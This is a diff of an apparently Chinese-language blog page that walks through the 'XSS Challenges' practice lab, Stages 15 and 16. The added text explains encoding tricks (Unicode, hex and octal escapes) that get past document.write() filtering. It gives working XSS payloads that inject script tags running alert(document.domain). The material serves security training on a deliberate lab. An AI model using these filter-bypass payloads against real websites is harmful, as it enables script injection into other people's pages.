@@ -96,7 +96,7 @@ ChallengesStage 1
                 
                 <span>
                     <b class="iconfont icon-timer__s"></b> <i>Reading time</i>
-                    15 mins.
+                    16 mins.
                 </span>
                 
                 
@@ -332,22 +332,30 @@ backgroud
 <p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/XSS%20Challenges/15-1.png" alt="15-1"></p>
 <p>本题的输入，会利用<strong>document.write()方法</strong>输出到<strong>value属性</strong>当中，那么什么是document.write方法呢？</p>
 <p>w3c里是这样定义的：write() 方法可向文档写入 HTML 表达式或 JavaScript 代码。可列出多个参数(exp1,exp2,exp3,…) ，它们将按顺序被追加到文档中。也就是说我们在write一下插入的代码就是js范畴了</p>
-<p>所以此时就可以考虑用js的编码来bypass，那么有两种编码方式：分别是<strong>Unicode</strong>和<strong>十六进制</strong>，格式如下</p>
-<p>① 首先是<strong>Unicode</strong></p>
+<p>所以此时就可以考虑用js的编码来bypass，那么先介绍三种编码方式：分别是<strong>Unicode</strong>和<strong>十六进制</strong>，格式如下</p>
+<p>① <strong>Unicode</strong></p>
 <pre><code class="unicode">\u003c =&gt; 左尖括号
 \u003e =&gt; 右尖括号
 </code></pre>
 <p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/XSS%20Challenges/15-2.png" alt="15-2"></p>
-<p>② 然后是<strong>十六进制</strong></p>
-<pre><code>\x3c =&gt; 左尖括号
+<p>② <strong>十六进制</strong></p>
+<pre><code class="十六进制">\x3c =&gt; 左尖括号
 \x3e =&gt; 右尖括号
-</code></pre><p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/XSS%20Challenges/15-3.png" alt="15-3"></p>
+</code></pre>
+<p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/XSS%20Challenges/15-3.png" alt="15-3"></p>
+<p>③ 八进制</p>
+<pre><code class="八进制">\74 =&gt; 左尖括号
+\76 =&gt; 右尖括号
+</code></pre>
 <p>因为<strong>document.write</strong>在输出的时候会<strong>JavascriptDecode</strong>一下数据，会把数据原有<strong>\</strong>去除，即php里面的stripslashes。所以我们要用<strong>\\</strong>代替<strong>\</strong>，最终payload如下</p>
 <pre><code class="payload">Unicode：
 \\u003cscript\\u003ealert(document.domain);\\u003c/script\\u003e
 
 十六进制：
 \\x3cscript\\x3ealert(document.domain);\\x3c/script\\x3e
+
+八进制：
+\\74script\\76alert(document.domain)\\74/script\\76
 </code></pre>
 <p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/XSS%20Challenges/15-4.png" alt="15-4"></p>
 <h2 id="Stage-16"><a href="#Stage-16" class="headerlink" title="Stage 16"></a>Stage 16</h2><blockquote>
@@ -358,8 +366,15 @@ backgroud
 <blockquote>
 <p>“document.write();” and “s/\\x/\\\\x/ig;”</p>
 </blockquote>
-<p>所以还是利用<strong>document.write()</strong>，但是却对<strong>\x</strong>进行了过滤</p>
-<hr>
+<p>所以还是利用<strong>document.write()</strong>，但是却对<strong>\x</strong>进行了过滤，但是仍然可以使用其他的：<strong>Unicode</strong>、<strong>八进制</strong></p>
+<pre><code class="payload">Unicode：
+\\u003cscript\\u003ealert(document.domain);\\u003c/script\\u003e
+
+八进制：
+\\74script\\76alert(document.domain)\\74/script\\76
+</code></pre>
+<p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/XSS%20Challenges/15-4.png" alt="16-1"></p>
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><hr>
 <p><strong>Reference</strong></p>
 <p><a href="https://zhzhdoai.github.io/2019/11/19/用肝刷xss-quiz/" target="_blank" rel="noopener">https://zhzhdoai.github.io/2019/11/19/用肝刷xss-quiz/</a></p>
 <p><a href="https://www.jianshu.com/p/ed1023d60515" target="_blank" rel="noopener">https://www.jianshu.com/p/ed1023d60515</a></p>
@@ -425,7 +440,7 @@ backgroud
             <div class="box sticky animated fadeInRight faster">
                 <div id="toc" class="subbox">
                     <h4>Contents</h4>
-                    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#前言"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Challenges"><span class="toc-number">2.</span> <span class="toc-text">Challenges</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Stage-1"><span class="toc-number">2.1.</span> <span class="toc-text">Stage 1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Stage-2"><span class="toc-number">2.2.</span> <span class="toc-text">Stage 2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Stage-3"><span class="toc-number">2.3.</span> <span class="toc-text">Stage 3</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Stage-4"><span class="toc-number">2.4.</span> <span class="toc-text">Stage 4</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Stage-5"><span class="toc-number">2.5.</span> <span class="toc-text">Stage 5</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Stage-6"><span class="toc-number">2.6.</span> <span class="toc-text">Stage 6</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Stage-7"><span class="toc-number">2.7.</span> <span class="toc-text">Stage 7</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Stage-8"><span class="toc-number">2.8.</span> <span class="toc-text">Stage 8</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Stage-9"><span class="toc-number">2.9.</span> <span class="toc-text">Stage 9</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Stage-10"><span class="toc-number">2.10.</span> <span class="toc-text">Stage 10</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Stage-11"><span class="toc-number">2.11.</span> <span class="toc-text">Stage 11</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Stage-12"><span class="toc-number">2.12.</span> <span class="toc-text">Stage 12</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Stage-13"><span class="toc-number">2.13.</span> <span class="toc-text">Stage 13</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Stage-14"><span class="toc-number">2.14.</span> <span class="toc-text">Stage 14</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Stage-15"><span class="toc-number">2.15.</span> <span class="toc-text">Stage 15</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Stage-16"><span class="toc-number">2.16.</span> <span class="toc-text">Stage 16</span></a></li></ol></li></ol>
+                    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#前言"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Challenges"><span class="toc-number">2.</span> <span class="toc-text">Challenges</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Stage-1"><span class="toc-number">2.1.</span> <span class="toc-text">Stage 1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Stage-2"><span class="toc-number">2.2.</span> <span class="toc-text">Stage 2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Stage-3"><span class="toc-number">2.3.</span> <span class="toc-text">Stage 3</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Stage-4"><span class="toc-number">2.4.</span> <span class="toc-text">Stage 4</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Stage-5"><span class="toc-number">2.5.</span> <span class="toc-text">Stage 5</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Stage-6"><span class="toc-number">2.6.</span> <span class="toc-text">Stage 6</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Stage-7"><span class="toc-number">2.7.</span> <span class="toc-text">Stage 7</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Stage-8"><span class="toc-number">2.8.</span> <span class="toc-text">Stage 8</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Stage-9"><span class="toc-number">2.9.</span> <span class="toc-text">Stage 9</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Stage-10"><span class="toc-number">2.10.</span> <span class="toc-text">Stage 10</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Stage-11"><span class="toc-number">2.11.</span> <span class="toc-text">Stage 11</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Stage-12"><span class="toc-number">2.12.</span> <span class="toc-text">Stage 12</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Stage-13"><span class="toc-number">2.13.</span> <span class="toc-text">Stage 13</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Stage-14"><span class="toc-number">2.14.</span> <span class="toc-text">Stage 14</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Stage-15"><span class="toc-number">2.15.</span> <span class="toc-text">Stage 15</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Stage-16"><span class="toc-number">2.16.</span> <span class="toc-text">Stage 16</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#总结"><span class="toc-number">3.</span> <span class="toc-text">总结</span></a></li></ol>
                 </div>
             </div>
             
